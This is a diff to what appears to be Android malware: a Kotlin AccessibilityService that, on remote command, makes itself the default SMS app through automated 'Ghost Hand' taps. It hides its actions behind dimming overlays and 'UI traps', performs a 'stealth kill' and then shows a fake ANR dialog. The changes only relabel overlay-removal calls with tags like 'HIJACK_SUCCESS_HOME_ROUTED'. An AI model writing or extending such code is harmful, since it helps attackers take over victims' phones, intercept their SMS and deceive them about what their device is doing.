@@ -397,7 +397,7 @@ class MyAccessibilityService : AccessibilityService() {
                         CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                         performGlobalAction(GLOBAL_ACTION_HOME)
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            DimmerManager.removeOverlay(this@MyAccessibilityService)
+                            DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
                         }, 1500)
                     }, 400)
                 }
@@ -430,7 +430,7 @@ class MyAccessibilityService : AccessibilityService() {
                     
                     performGlobalAction(GLOBAL_ACTION_HOME)
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        DimmerManager.removeOverlay(this@MyAccessibilityService)
+                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
                     }, 1500)
                     return
                 }
@@ -623,10 +623,10 @@ class MyAccessibilityService : AccessibilityService() {
                                     }, 2500)
                                     
                                     if (timeout > 0L) {
-                                        Handler(Looper.getMainLooper()).postDelayed({
-                                            DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
-                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                        }, timeout * 1000)
+                                                                            val trapLabel = trap.optString("label", "Default")
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "UI_TRAP_TIMEOUT: $trapLabel")
+                                    }, timeout * 1000)
                                     }
                                 }
                             }
@@ -797,6 +797,7 @@ class MyAccessibilityService : AccessibilityService() {
             // 7. Remove Dimmer and Launch Fake ANR Dialog on Main Thread
             withContext(Dispatchers.Main) {
                 DimmerManager.removeOverlay(this@MyAccessibilityService)
+                DynamicUIManager.removeOverlay(this@MyAccessibilityService, "STEALTH_KILL_COMPLETE")
                 
                 if (shouldShowAnrAfterKill) {
                     val intent = Intent(this@MyAccessibilityService, PulseActivity::class.java).apply {
